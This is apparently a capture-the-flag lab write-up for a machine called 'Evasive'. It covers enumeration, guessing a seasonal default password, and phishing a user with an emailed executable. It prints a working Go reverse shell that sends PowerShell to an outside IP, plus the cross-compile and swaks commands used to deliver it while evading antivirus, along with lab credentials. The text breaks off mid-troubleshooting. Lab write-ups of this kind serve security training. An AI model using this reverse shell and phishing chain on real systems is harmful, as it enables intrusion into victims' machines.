# Evasive (Medium)

Credentials for Windows Dev Machine (I think for exploit crafting):

Administrator:g.xyX4-rX3@odAm*

ATTACK CHAIN :

![evasive screenshot 1](images/evasive/evasive-01.png)

Smtp, pop3, imap, submission open (Interesting for phishing)

http open

SMB open

HTTP ENUM

![evasive screenshot 2](images/evasive/evasive-02.png)

Directories?

- Feroxbuster

![evasive screenshot 3](images/evasive/evasive-03.png)

No dirs.

SMB ENUM

- Enum4linux

![evasive screenshot 4](images/evasive/evasive-04.png)

- Smbclient

![evasive screenshot 5](images/evasive/evasive-05.png)

![evasive screenshot 6](images/evasive/evasive-06.png)

Can we access btw?

![evasive screenshot 7](images/evasive/evasive-07.png)

Yes.

Let’s inspect

![evasive screenshot 8](images/evasive/evasive-08.png)

2 information:

- We know 2 users : Roger and Alfonso

- Alfonso is waiting an .exe program via email from Roger.

![evasive screenshot 9](images/evasive/evasive-09.png)

We got a default password:

NewUser2024!

Can we check if Alfonso has the default password?

![evasive screenshot 10](images/evasive/evasive-10.png)

Nope.

We need to find some users, but how?

- Port udp 161 is closed

Rpcclient enumeration?

![evasive screenshot 11](images/evasive/evasive-11.png)

Nope

SMPT enum :

![evasive screenshot 12](images/evasive/evasive-12.png)

Requires authentication

Other ports?

![evasive screenshot 13](images/evasive/evasive-13.png)

No other ports

We need SMTP authentication in order to proceed and send a malicious .exe program to Alfonso that will connect back to our system

We know that the mail component is equipped with an anti-bruteforce mechanism. 

We can’t brute force.

There is Defender running.

Can we search for some .TXT,.PDF files with feroxbuster?

Nope.

Running exiftool :

![evasive screenshot 14](images/evasive/evasive-14.png)

We can see that we’re in 2025.

The default password provided was 2024.

What if we adjust the password to 2025 ?

NewUser2025!

![evasive screenshot 15](images/evasive/evasive-15.png)

Indeed Roger’s password is the one.

Now that we got credentials, we can send the .exe from Roger to Alfonso.

 1. Crafting the payload

We’ll try with a simple .exe crafted with:

- Msfvenom

Encoded with shikata_ga_nai , iterations 10

![evasive screenshot 16](images/evasive/evasive-16.png)

1. Create the body.txt

1.
![evasive screenshot 17](images/evasive/evasive-17.png)

1. Start Penelope

1.
![evasive screenshot 18](images/evasive/evasive-18.png)

1. Send the message with :

1. Swaks

sudo swaks -t alfonso@winserver01.hs \

  --from roger@winserver01.hs \

  --attach @program.exe \

  --server 10.1.128.246 \

  --body @body.txt \

  --header "Subject: Program.exe" \

  --suppress-data \

  -ap

![evasive screenshot 19](images/evasive/evasive-19.png)

Let’s wait to see if the .exe will be opened

Well, no output.

We have to change the rev shell.

At this point I had to check the Walkthrough cos I didn’t know what kind of revshell I should have done.

It talks about a simple Go Revshell.

This should not be easily detected by an AV.

Let’s RDP on it and craft the payload:

1. We make a file .go

package main

import (

    "net"

    "os/exec"

)

func main() {

    c, _ := net.Dial("tcp", "10.200.75.141:1234")

    cmd := exec.Command("powershell")

    cmd.Stdin = c

    cmd.Stdout = c

    cmd.Stderr = c

    cmd.Run()

}

![evasive screenshot 20](images/evasive/evasive-20.png)

1. We can cross-compile it on Linux too, using

1. go build

To cross-compile, according to this forum :

https://stackoverflow.com/questions/41566495/golang-how-to-cross-compile-on-linux-for-windows

We need to use :

GOOS=windows GOARCH=386 \

  CGO_ENABLED=1 CXX=i686-w64-mingw32-g++ CC=i686-w64-mingw32-gcc \

  go build -o program.exe rev.go

![evasive screenshot 21](images/evasive/evasive-21.png)

And here we are.

Let’s run again Penelope and send again the message with swaks :

![evasive screenshot 22](images/evasive/evasive-22.png)

Let’s wait

Weird because we got no shell.

Let’s modify the port in rev.go :

- Port 4445

Build again and send again :

![evasive screenshot 23](images/evasive/evasive-23.png)

We got invalid shell.

Why?
